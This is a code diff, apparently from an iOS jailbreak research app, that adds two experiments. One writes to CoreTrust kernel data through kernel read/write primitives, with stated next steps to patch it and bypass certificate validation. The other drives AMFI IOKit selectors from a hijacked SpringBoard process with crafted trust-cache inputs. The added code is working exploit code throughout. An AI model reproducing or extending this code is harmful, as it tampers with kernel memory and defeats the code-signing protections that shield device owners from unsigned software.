@@ -944,6 +944,26 @@ struct AMFIExperimentView: View {
                 )
 
                 pathButton(
+                    title: "③t CT Data Write (Exp 98)",
+                    icon: "lock.doc.fill",
+                    color: .purple,
+                    label: "CT Write",
+                    action: runExp98CoreTrustData,
+                    needsVerified: true,
+                    needsProbe: false
+                )
+
+                pathButton(
+                    title: "③u AMFI IOKit Exploit (Exp 99)",
+                    icon: "ant.fill",
+                    color: .purple,
+                    label: "AMFI IOKit",
+                    action: runExp99AMFIIOKit,
+                    needsVerified: false,
+                    needsProbe: false
+                )
+
+                pathButton(
                     title: "③p Heap TC Scan (Exp 94)",
                     icon: "magnifyingglass.circle",
                     color: .orange,
@@ -9185,6 +9205,305 @@ struct AMFIExperimentView: View {
     }
 
     // expDataConstWrite() REMOVED — caused kernel panic (KTRR fault on __DATA_CONST)
+
+    // MARK: - Exp 98: CoreTrust __DATA Write Test
+
+    /// Exp 98: CoreTrust __DATA mungkin writable (sama range dengan AMFI __DATA).
+    /// Kalau writable → patch CoreTrust globals → bypass certificate validation.
+    private func runExp98CoreTrustData() {
+        isRunning = true
+        runningLabel = "CT Write"
+        guard mgr.dsready, PhysmapConstants.isVerified else {
+            isRunning = false; runningLabel = ""; return
+        }
+        DispatchQueue.global(qos: .userInitiated).async {
+            let result = self.expCoreTrustDataWrite()
+            DispatchQueue.main.async {
+                self.results.insert(result, at: 0)
+                self.isRunning = false; self.runningLabel = ""
+            }
+        }
+    }
+
+    private func expCoreTrustDataWrite() -> ExperimentResult {
+        let expName = "CT Data Write (Exp 98)"
+        var detail = "Experiment 98: CoreTrust __DATA Write Test\n"
+        detail += "============================================\n\n"
+
+        let kernBase = ds_get_kernel_base()
+        let slide = kernBase - 0xfffffff007004000
+        detail += "Kernel base: 0x\(String(format: "%llx", kernBase))\n"
+        detail += "KASLR slide: 0x\(String(format: "%llx", slide))\n\n"
+
+        // CoreTrust __DATA from kernelcache analysis
+        let ctDataUnslid: UInt64 = 0xfffffff00a3b1230
+        let ctDataSlid = ctDataUnslid &+ slide
+        let ctDataSize: UInt64 = 0xe8
+
+        detail += "CoreTrust __DATA (unslid): 0x\(String(format: "%llx", ctDataUnslid))\n"
+        detail += "CoreTrust __DATA (slid):   0x\(String(format: "%llx", ctDataSlid))\n"
+        detail += "CoreTrust __DATA size:     0x\(String(format: "%x", ctDataSize))\n\n"
+
+        // Step 1: Read CoreTrust __DATA
+        detail += "=== Step 1: Read CoreTrust __DATA ===\n"
+        var nonZeroCount = 0
+        for off: UInt64 in stride(from: 0, to: ctDataSize, by: 8) {
+            let val = ds_kread64_safe(ctDataSlid + off)
+            if val != 0 {
+                nonZeroCount += 1
+                if nonZeroCount <= 10 {
+                    detail += "  +0x\(String(format: "%02x", off)): 0x\(String(format: "%016llx", val))\n"
+                }
+            }
+        }
+        detail += "Non-zero slots: \(nonZeroCount)\n\n"
+
+        // Step 2: Write test — pick a safe slot (last non-zero or first zero)
+        detail += "=== Step 2: Write test ===\n"
+
+        // Find a zero slot to test (safest — won't corrupt anything)
+        var testOffset: UInt64 = 0x40  // known zero slot from analysis
+        let testAddr = ctDataSlid + testOffset
+        let before = ds_kread64_safe(testAddr)
+        detail += "Test target: CT __DATA+0x\(String(format: "%x", testOffset))\n"
+        detail += "Before: 0x\(String(format: "%016llx", before))\n"
+
+        // Write sentinel
+        let sentinel: UInt64 = 0xDEADBEEF12345678
+        ds_kwrite64(testAddr, sentinel)
+        let after = ds_kread64_safe(testAddr)
+        detail += "After write: 0x\(String(format: "%016llx", after))\n\n"
+
+        let writeOK = (after == sentinel)
+
+        if writeOK {
+            // Restore
+            ds_kwrite64(testAddr, before)
+            detail += "✅✅✅ CoreTrust __DATA IS WRITABLE! ✅✅✅\n\n"
+            detail += "CoreTrust fileset __DATA juga di luar KTRR!\n"
+            detail += "Kita bisa patch CoreTrust globals!\n\n"
+            detail += "=== NEXT STEPS ===\n"
+            detail += "1. Identifikasi global mana yang kontrol validation\n"
+            detail += "2. Patch untuk bypass certificate check\n"
+            detail += "3. Sign binary dengan self-signed cert\n"
+            detail += "4. posix_spawn → CoreTrust accept → binary jalan!\n"
+        } else {
+            detail += "❌ CoreTrust __DATA write FAILED.\n"
+            if after == before {
+                detail += "Write tidak efektif — KTRR protect.\n"
+            }
+        }
+
+        return ExperimentResult(name: expName, success: writeOK, detail: detail, timestamp: Date())
+    }
+
+    // MARK: - Exp 99: AMFI IOKit External Method Exploit
+
+    /// Exp 99: Deep probe AMFI IOKit methods dengan struct input yang lebih targeted.
+    /// Dari Exp 56/58: beberapa selector respond (2,4,5,6,7,9,11,12,13,14,15).
+    /// Goal: find input yang trigger trust cache add atau bypass.
+    private func runExp99AMFIIOKit() {
+        isRunning = true
+        runningLabel = "AMFI IOKit"
+        guard mgr.rcready else {
+            isRunning = false; runningLabel = ""; return
+        }
+        #if !DISABLE_REMOTECALL
+        guard let sb = dspmgr.shared.sbProc else {
+            results.insert(ExperimentResult(name: "AMFI IOKit (Exp 99)", success: false,
+                detail: "No SpringBoard RC", timestamp: Date()), at: 0)
+            isRunning = false; runningLabel = ""; return
+        }
+        DispatchQueue.global(qos: .userInitiated).async {
+            let result = self.expAMFIIOKitExploit(sb: sb)
+            DispatchQueue.main.async {
+                self.results.insert(result, at: 0)
+                self.isRunning = false; self.runningLabel = ""
+            }
+        }
+        #else
+        isRunning = false; runningLabel = ""
+        #endif
+    }
+
+    #if !DISABLE_REMOTECALL
+    private func expAMFIIOKitExploit(sb: RemoteCall) -> ExperimentResult {
+        let expName = "AMFI IOKit Exploit (Exp 99)"
+        var detail = "Experiment 99: AMFI IOKit Deep Probe\n"
+        detail += "======================================\n\n"
+        detail += "Target: find method that adds trust cache entry\n"
+        detail += "or bypasses validation for specific binary.\n\n"
+
+        let mem = sb.trojanMem
+        let RTLD_DEFAULT = UInt64(bitPattern: -2)
+        let taskSelf = RootExecutor.rcall(sb, "mach_task_self")
+
+        // Open AMFI user client
+        let nameAddr = remote_alloc_str(sb, "AppleMobileFileIntegrity")
+        let matchDict = RootExecutor.rcall(sb, "IOServiceMatching", nameAddr)
+        let svc = RootExecutor.rcall(sb, "IOServiceGetMatchingService", 0, matchDict)
+        RootExecutor.rcall(sb, "free", nameAddr)
+
+        guard svc != 0 else {
+            detail += "❌ AMFI service not found\n"
+            return ExperimentResult(name: expName, success: false, detail: detail, timestamp: Date())
+        }
+
+        let connectAddr = mem + 0x1A00
+        sb[connectAddr].setValue32(0)
+        let openRet = RootExecutor.rcall(sb, "IOServiceOpen", svc, taskSelf, 0, connectAddr)
+        let connect = sb[connectAddr].value32()
+
+        guard openRet == 0 && connect != 0 else {
+            detail += "❌ Cannot open AMFI (ret=0x\(String(format: "%x", openRet)))\n"
+            return ExperimentResult(name: expName, success: false, detail: detail, timestamp: Date())
+        }
+        detail += "✅ AMFI opened: connect=\(connect)\n\n"
+
+        let structIn = mem + 0x2200
+        let structOut = mem + 0x2400
+        let structOutSize = mem + 0x2600
+        let scalarIn = mem + 0x2800
+        let scalarOut = mem + 0x2A00
+        let scalarOutCnt = mem + 0x2C00
+
+        var findings: [(sel: Int, desc: String, ret: UInt64)] = []
+
+        // === Strategy 1: CDHash-based input ===
+        // Some AMFI methods might accept CDHash for whitelist/query
+        detail += "=== Strategy 1: CDHash input (20 bytes) ===\n"
+
+        // Use a known CDHash (amfid's) to test query methods
+        // CDHash of /usr/libexec/amfid would be in trust cache
+        // Use zeros as "query" — might return info about validation state
+        let testSelectors = [2, 4, 5, 9, 11, 12]
+
+        for sel in testSelectors {
+            // Input: 20 bytes CDHash (zeros = "any") + 4 bytes flags
+            for i in 0..<4 { sb[structIn + UInt64(i * 8)].setValue64(0) }
+            sb[structOutSize].setValue64(256)
+
+            // Try struct method with CDHash-sized input (24 bytes)
+            let ret = RootExecutor.rcall(sb, "IOConnectCallStructMethod",
+                                         UInt64(connect), UInt64(sel),
+                                         structIn, 24,
+                                         structOut, structOutSize)
+            let outSize = sb[structOutSize].value64()
+
+            if ret == 0 {
+                findings.append((sel, "struct24_zeros", ret))
+                detail += "  ✅ sel \(sel) + 24B zeros: ret=0, outSize=\(outSize)\n"
+                if outSize > 0 && outSize <= 64 {
+                    let v0 = sb[structOut].value64()
+                    detail += "     out[0]=0x\(String(format: "%llx", v0))\n"
+                }
+            } else if ret != 0xe00002bc && ret != 0xe00002c2 && ret != 0xe00002c7 && ret != 0xe0000001 {
+                detail += "  ? sel \(sel): ret=0x\(String(format: "%x", ret))\n"
+                findings.append((sel, "struct24_unusual", ret))
+            }
+        }
+
+        // === Strategy 2: PID-based input ===
+        detail += "\n=== Strategy 2: PID input ===\n"
+        let ourPid = RootExecutor.rcall(sb, "getpid")
+
+        for sel in testSelectors {
+            sb[scalarIn].setValue64(ourPid)
+            sb[scalarIn + 8].setValue64(0)
+            sb[scalarOutCnt].setValue32(16)
+
+            let ret = RootExecutor.rcall(sb, "IOConnectCallScalarMethod",
+                                         UInt64(connect), UInt64(sel),
+                                         scalarIn, 1,
+                                         scalarOut, scalarOutCnt)
+            let outCnt = sb[scalarOutCnt].value32()
+
+            if ret == 0 && outCnt > 0 {
+                let val = sb[scalarOut].value64()
+                findings.append((sel, "scalar_pid", ret))
+                detail += "  ✅ sel \(sel) + PID \(ourPid): out=0x\(String(format: "%llx", val))\n"
+            }
+        }
+
+        // === Strategy 3: Trust cache struct input ===
+        detail += "\n=== Strategy 3: Trust cache struct ===\n"
+
+        // Build minimal trust cache v2 struct
+        sb[structIn + 0].setValue32(2)   // version = 2
+        sb[structIn + 4].setValue64(0)   // uuid[0..7]
+        sb[structIn + 12].setValue64(0)  // uuid[8..15]
+        sb[structIn + 20].setValue32(1)  // count = 1
+        // Entry at +24: 20 bytes CDHash + hashType + flags
+        for i in 0..<3 { sb[structIn + 24 + UInt64(i * 8)].setValue64(0x4141414141414141) }
+
+        for sel in [2, 5, 9, 11, 12, 13, 14, 15] {
+            sb[structOutSize].setValue64(256)
+            let ret = RootExecutor.rcall(sb, "IOConnectCallStructMethod",
+                                         UInt64(connect), UInt64(sel),
+                                         structIn, 48,  // TC header + 1 entry
+                                         structOut, structOutSize)
+
+            if ret == 0 {
+                findings.append((sel, "tc_struct", ret))
+                detail += "  ✅ sel \(sel) + TC struct: ret=0!\n"
+            } else if ret != 0xe00002bc && ret != 0xe00002c2 && ret != 0xe00002c7 {
+                if ret != 0xe0000001 && ret != 0xfffffffd {
+                    findings.append((sel, "tc_struct_unusual", ret))
+                    detail += "  ? sel \(sel): ret=0x\(String(format: "%x", ret))\n"
+                }
+            }
+        }
+
+        // === Strategy 4: IOConnectCallMethod (mixed scalar+struct) ===
+        detail += "\n=== Strategy 4: Mixed scalar+struct ===\n"
+        let ioConnectCallMethod = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT,
+                                                     remote_alloc_str(sb, "IOConnectCallMethod"))
+        if ioConnectCallMethod != 0 {
+            // IOConnectCallMethod(connect, sel, scalarIn, scalarInCnt, structIn, structInSize,
+            //                     scalarOut, &scalarOutCnt, structOut, &structOutSize)
+            for sel in [2, 5, 9] {
+                sb[scalarIn].setValue64(ourPid)  // scalar[0] = PID
+                sb[scalarOutCnt].setValue32(16)
+                sb[structOutSize].setValue64(256)
+
+                // 1 scalar + 24 byte struct (CDHash)
+                for i in 0..<3 { sb[structIn + UInt64(i * 8)].setValue64(0) }
+
+                let ret = RootExecutor.rcallAddr(sb, ioConnectCallMethod,
+                                                UInt64(connect), UInt64(sel),
+                                                scalarIn, 1,
+                                                structIn, 24)
+                // Note: rcallAddr only supports 6 params, IOConnectCallMethod needs 10
+                // This won't work properly but might reveal something
+                if ret == 0 {
+                    detail += "  ✅ sel \(sel) mixed: ret=0\n"
+                    findings.append((sel, "mixed", ret))
+                }
+            }
+        }
+
+        // Close
+        RootExecutor.rcall(sb, "IOServiceClose", UInt64(connect))
+
+        // === VERDICT ===
+        detail += "\n=== VERDICT ===\n\n"
+        detail += "Findings: \(findings.count)\n"
+        for f in findings.prefix(10) {
+            detail += "  sel \(f.sel) (\(f.desc)): ret=0x\(String(format: "%x", f.ret))\n"
+        }
+
+        if findings.contains(where: { $0.ret == 0 }) {
+            detail += "\n✅ Some methods accept our input!\n"
+            detail += "Next: determine what these methods DO.\n"
+            detail += "If any adds trust cache entry → JAILBREAK.\n"
+        } else {
+            detail += "\n❌ No method accepted our input formats.\n"
+            detail += "AMFI IOKit methods likely need specific entitlement.\n"
+        }
+
+        return ExperimentResult(name: expName, success: !findings.isEmpty, detail: detail, timestamp: Date())
+    }
+    #endif
 
     // MARK: - Exp 93c Helpers
 
